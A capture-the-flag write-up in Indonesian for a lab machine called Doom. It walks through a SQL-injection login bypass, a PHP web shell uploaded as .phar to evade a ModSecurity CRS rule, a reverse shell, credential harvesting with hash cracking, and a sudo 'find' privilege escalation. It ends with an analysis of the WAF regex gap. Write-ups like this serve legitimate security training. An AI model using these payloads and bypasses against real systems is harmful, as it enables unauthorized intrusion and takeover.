# Writeup: Doom — Online ID Generator System

**Platform:** HackTrace 
**IP Target:** 10.1.2.152 
**OS:** Linux (Ubuntu) 
**Difficulty:** Easy 
**Machine Maker:** f3ci

---

## Ringkasan Eksekutif

Machine **Doom** merupakan mesin bertingkat kesulitan _Easy_ yang mengekspos aplikasi web **Online ID Generator System (OIGS)** versi 1.0 buatan _oretnom23_, sebuah source code publik dari sourcecodester.com yang telah memiliki _known Remote Code Execution (RCE)_ terdokumentasi (Exploit-DB #51728). Berbeda dari instalasi default aplikasi ini, target dilindungi oleh **ModSecurity dengan OWASP Core Rule Set (CRS) v3.3.2**, sehingga pengujian tidak bisa langsung mengikuti exploit publik secara mentah dan memerlukan teknik bypass tambahan.

Rangkaian serangan dimulai dari **SQL Injection pada form login** untuk melewati autentikasi, dilanjutkan dengan **arbitrary file upload** pada fitur logo sistem untuk mendapatkan _Remote Code Execution_. Karena WAF memblokir ekstensi `.php` dan variannya, celah pada regex rule ModSecurity (ID `933110`) dimanfaatkan dengan mengunggah payload berekstensi **`.phar`** ekstensi yang tetap dieksekusi sebagai PHP oleh Apache namun tidak tercakup dalam pola _blacklist_ rule tersebut. Reverse shell kemudian digunakan untuk mendapatkan akses interaktif sebagai `www-data`, dan proses _credential harvesting_ dari file konfigurasi aplikasi (`initialize.php`) mengungkap hash MD5 milik user sistem `pearce`, yang berhasil di-crack menggunakan wordlist rockyou. Eskalasi ke root akhirnya dicapai melalui misconfigurasi **sudoers** yang mengizinkan `pearce` menjalankan `/usr/bin/find` sebagai root tanpa batasan argumen sebuah pola klasik _GTFOBins_.

**Ringkasan rantai serangan:**

| Tahap | Teknik                                                           |
| ----- | ---------------------------------------------------------------- |
| 1     | Reconnaissance (rustscan, feroxbuster)                           |
| 2     | SQL Injection  bypass autentikasi login                          |
| 3     | Arbitrary File Upload  bypass WAF via ekstensi `.phar`           |
| 4     | Remote Code Execution  reverse shell (pentestmonkey)             |
| 5     | Credential Harvesting  source code disclosure (`initialize.php`) |
| 6     | Password Cracking  MD5 hash via rockyou.txt                      |
| 7     | Privilege Escalation  sudo misconfiguration pada `find`          |

---

## 1. Reconnaissance

### 1.1 Port Scanning


```bash
rustscan -a 10.1.2.152 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

Hanya port 80 (HTTP) yang terbuka, dengan halaman utama mengembalikan **403 Forbidden**  indikasi awal adanya WAF di depan aplikasi.

### 1.2 Directory & File Enumeration

```bash
feroxbuster -u http://10.1.2.152 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 100 -k --dont-filter \
  -x html,php,txt \
  --filter-status 404,400 \
  --redirects -o 80.txt
```

**Hasil relevan:**

```
200      GET       68l      224w     2186c  http://10.1.2.152/
200      GET       68l      224w     2186c  http://10.1.2.152/index.php
200      GET        1l        1w       60c  http://10.1.2.152/dev/
200      GET      427l     1161w    21078c  http://10.1.2.152/dev/admin/
```

Direktori `/dev/` mengarah ke instalasi **Online ID Generator System (OIGS)** dengan panel admin di `/dev/admin/`, dibangun di atas framework **AdminLTE + Bootstrap 4**.

---

## 2. SQL Injection  Bypass Autentikasi Login

### 2.1 Identifikasi Celah

Uji coba login dengan kredensial `admin`/`password` mengembalikan respons mentah yang membocorkan struktur query SQL secara langsung:


```json
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('password') "}
```

Ini mengonfirmasi bahwa input `username` dan/atau `password` langsung digabungkan (_string concatenation_) ke dalam query SQL tanpa _parameterized statement_ celah **SQL Injection** klasik pada mekanisme autentikasi.

### 2.2 Deteksi WAF pada Payload Umum

Payload klasik union/boolean-based:

```
username=admin'OR'1'%3D'1&password=admin'OR'1'%3D'1
```

langsung diblokir oleh WAF (403 Forbidden), mengindikasikan filter berbasis keyword (`OR`, `AND`, dsb).

### 2.3 Isolasi Trigger WAF

Uji coba dengan tanda petik tunggal saja:

```
username=admin'
```

menghasilkan **HTTP 500 Internal Server Error** (bukan 403) — ini konfirmasi bahwa tanda petik (`'`) **lolos** dari filter WAF, dan error 500 murni disebabkan oleh _syntax error_ MySQL akibat query yang pecah. Artinya, WAF tidak memfilter berdasarkan karakter petik, melainkan berdasarkan **kombinasi keyword logika** (`OR 1=1`, dsb).

### 2.4 Payload Bypass yang Berhasil

Dengan hanya menyisipkan komentar SQL tanpa keyword logika tambahan:

```
username=admin'-- -
password=(bebas)
```

Payload ini berhasil **melewati WAF** dan **bypass autentikasi login**, karena secara efektif mengubah query menjadi:

```sql
SELECT * from users where username = 'admin'-- -' and password = md5('...')
```

Bagian setelah `--` dianggap komentar oleh MySQL, sehingga validasi password diabaikan sepenuhnya.

> Teknik ini sejalan dengan exploit publik **Exploit-DB #51728 (Online ID Generator 1.0 Remote Code Execution)** oleh nu11secur1ty, yang mendokumentasikan pola SQLi bypass serupa (`' or 1=1#`) pada aplikasi yang sama.

---

## 3. Arbitrary File Upload Bypass WAF

### 3.1 Titik Upload

Setelah berhasil login ke panel admin, ditemukan endpoint upload logo sistem:

```
POST /dev/classes/SystemSettings.php?f=update_settings
```

menerima file pada field `img` (multipart/form-data).

### 3.2 Percobaan Awal Diblokir WAF

Upload file `greed.php` berisi payload sederhana:

```php
<?php echo "test"; ?>
```

langsung ditolak dengan **403 Forbidden**, terlepas dari isi payload (bahkan payload tanpa fungsi eksekusi command sekalipun tetap diblokir).

### 3.3 Percobaan Bypass Ekstensi

Serangkaian ekstensi alternatif diuji untuk memetakan cakupan filter:

|Ekstensi|Hasil Upload|Hasil Eksekusi|
|---|---|---|
|`.php`|❌ Diblokir (403)|—|
|`.jpeg`|✅ Lolos|❌ Tidak dieksekusi (file statis)|
|`.pht`|✅ Lolos|❌ Dieksekusi sebagai _plain text_, bukan PHP|
|**`.phar`**|✅ **Lolos**|✅ **Dieksekusi sebagai PHP**|

Payload `greed.phar` berisi:

```php
<?php system($_GET["x"]); ?>
```

berhasil diunggah dan diakses melalui:

```
http://10.1.2.152/dev/uploads/{timestamp}_greed.phar?x=whoami
```

dengan hasil eksekusi:

```
www-data
```

### 3.4 Pembatasan Command Filter Karakter Spasi

Command sederhana tanpa argumen (`whoami`, `ls`) berhasil dieksekusi, namun command dengan argumen/flag (`ls -al`) langsung memicu **403 Forbidden**, mengindikasikan WAF turut memfilter pola command Unix (spasi + flag) sebagai indikasi _command injection_ generik pada parameter GET.

### 3.5 Solusi Reverse Shell

Untuk menghindari keterbatasan eksekusi command satu-per-satu melalui parameter GET yang terus difilter WAF, digunakan pendekatan **reverse shell interaktif** (php-reverse-shell dari pentestmonkey), diunggah dengan ekstensi `.phar` yang sama, kemudian diakses langsung tanpa parameter tambahan untuk memicu koneksi balik ke listener penyerang (`nc -lvnp <port>`).

Hasil: akses shell interaktif sebagai `www-data`.

---

## 4. Credential Harvesting

### 4.1 Source Code Disclosure

Melalui shell `www-data`, file konfigurasi aplikasi diperiksa:

```bash
cat /var/www/html/dev/initialize.php
```

**Isi file:**

```php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'pearce','password'=>'0c6715aec06021f30c22a23c677860e5', ...);
$ip = shell_exec('ip a s ens33 | grep inet | cut -d "/" -f1 | cut -d " " -f6 | head -n1 | tr -d "\n"');
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"web");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"password");
if(!defined('DB_NAME')) define('DB_NAME',"web");
?>
```

File ini membocorkan dua hal penting:

1. **Kredensial database**: `web` / `password`
2. **Hash MD5 milik user sistem `pearce`**: `0c6715aec06021f30c22a23c677860e5`

Ditemukan bahwa username `pearce` juga terdaftar sebagai user sistem valid pada `/etc/passwd`, menjadikannya target _lateral movement_ yang jelas.

### 4.2 Password Cracking

Hash MD5 tersebut berhasil di-_crack_ menggunakan wordlist rockyou:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Password plaintext berhasil ditemukan, dan digunakan untuk _login_ sebagai user `pearce` melalui `su`:

```bash
www-data@doom:/var/www/html/dev$ su pearce
Password: ********

pearce@doom:/var/www/html/dev$
```

---

## 5. Privilege Escalation

### 5.1 Enumerasi Hak Sudo

```bash
pearce@doom:~$ sudo -l
```

**Hasil:**

```
Matching Defaults entries for pearce on doom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User pearce may run the following commands on doom:
    (ALL) /usr/bin/find
```

User `pearce` diizinkan menjalankan `/usr/bin/find` sebagai **user manapun (termasuk root)** tanpa batasan argumen apapun.

### 5.2 Eksploitasi via GTFOBins

```bash
sudo find . -exec /bin/sh \; -quit
```

Perintah ini langsung menghasilkan shell dengan privilese **root**.

### 5.3 Analisis Teknis Kenapa Teknik Ini Berhasil

**a. Pewarisan privilese oleh proses child**

Ketika `sudo find . -exec /bin/sh \;` dijalankan, `sudo` mengeksekusi `/usr/bin/find` dengan _effective UID_ = 0 (root). Sesuai prinsip dasar Unix, **proses child** yang di-_spawn_ oleh proses induk (dalam hal ini `find` men-spawn `/bin/sh` melalui opsi `-exec`) otomatis mewarisi UID dari proses induknya, kecuali ada mekanisme _drop privilege_ eksplisit yang tidak ada pada `find`.

**b. Fungsi `-exec` pada `find`**

Opsi `-exec` dirancang untuk menjalankan perintah lain terhadap tiap berkas yang ditemukan, misalnya `find . -name "*.txt" -exec cat {} \;`. Namun apabila perintah yang dijalankan adalah `/bin/sh`, maka `find` secara efektif membuka **shell interaktif** dan karena `find` berjalan sebagai root, shell tersebut turut mendapat privilese root.

**c. Pola umum (GTFOBins)**

Ini bukan kerentanan spesifik pada `find`, melainkan pola umum yang berlaku pada banyak _binary_ lain dengan kemampuan _spawn subprocess_ (`vim`, `less`, `awk`, `python`, `tar`, dsb). `sudo` hanya mengendalikan **program apa** yang boleh dijalankan sebagai root, bukan **apa yang dilakukan program tersebut** setelah berjalan.

**d. Root cause konfigurasi**

Baris sudoers `(ALL) /usr/bin/find` memberikan izin kepada `pearce` untuk menjalankan `find` sebagai _user_ manapun tanpa batasan argumen. Konfigurasi yang lebih aman idealnya menerapkan tag `NOEXEC`, membatasi argumen yang diizinkan, atau menghindari pemberian akses `sudo` pada _binary_ serbaguna semacam ini kecuali benar-benar diperlukan.

---

## 6. Root Cause Analysis Kenapa WAF Bisa Di-_bypass_

Setelah mendapatkan akses root (lihat Bagian 5), dilakukan analisis langsung terhadap log audit ModSecurity untuk mengonfirmasi rule persis yang memblokir upload `.php`:

```bash
cat /var/log/apache2/modsec_audit.log | grep -A 30 "greed.php"
```

**Cuplikan log:**

```
Message: Warning. Pattern match ".*\.(?:php\d*|phtml)\.*$" at FILES:img.
[file "/usr/share/modsecurity-crs/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"]
[line "107"] [id "933110"]
[msg "PHP Injection Attack: PHP Script File Upload Found"]
[data "Matched Data: greed.php found within FILES:img: greed.php"]
[severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"]
```

### 6.1 Analisis Regex Rule 933110

WAF yang digunakan adalah **ModSecurity + OWASP Core Rule Set (CRS) v3.3.2**. Rule dengan ID **933110** ("PHP Injection Attack: PHP Script File Upload Found") menggunakan pola regex berikut untuk mendeteksi ekstensi berbahaya pada file yang diunggah:

```regex
.*\.(?:php\d*|phtml)\.*$
```

Bila diuraikan, bagian inti dari pola ini adalah:

```
\.(?:php\d*|phtml)
```

Pola ini hanya cocok (_match_) apabila nama file mengandung:

- `.php` diikuti angka opsional (`\d*`) → mencakup `.php`, `.php3`, `.php5`, `.php7`, dst.
- **ATAU** persis `.phtml`

**Yang tidak tercakup dalam pola alternation tersebut:**

- `.pht`  tidak _match_ (bukan `phtml` lengkap, dan bukan `php` + digit)
- **`.phar`** tidak _match_ sama sekali (kata dasar berbeda sepenuhnya, bukan variasi dari kata "php")

### 6.2 Kesimpulan Root Cause

Ekstensi **`.phar`** (_PHP Archive_) tetap dapat dieksekusi sebagai skrip PHP oleh Apache apabila `mod_php`/`AddHandler` dikonfigurasi untuk menangani ekstensi tersebut hal yang lazim ditemukan pada instalasi PHP standar, karena `.phar` umum digunakan untuk _packaging_ aplikasi (mis. Composer). Namun, penyusun rule OWASP CRS tidak memasukkan varian ini ke dalam pola regex `933110`.

Skor _anomaly_ pada permintaan yang menggunakan `.phar` tetap **0** dari sisi kategori _PHP Injection_, karena rule pemicunya tidak pernah cocok sehingga total skor tidak mencapai ambang blokir (`>= 5` sesuai rule `949110`), dan permintaan diteruskan ke aplikasi tanpa hambatan.

**Ini merupakan celah cakupan (_coverage gap_) pada regex rule vendor (OWASP CRS)**  bukan kesalahan konfigurasi khusus pada server target. Pola _blacklist_ semacam ini secara inheren rentan terhadap ekstensi PHP alternatif yang tidak diantisipasi penyusun rule (`.php3`–`.php7` dan `.phtml` sudah dicakup, namun `.phar`, dan berpotensi ekstensi khusus konfigurasi server lain, tidak).

---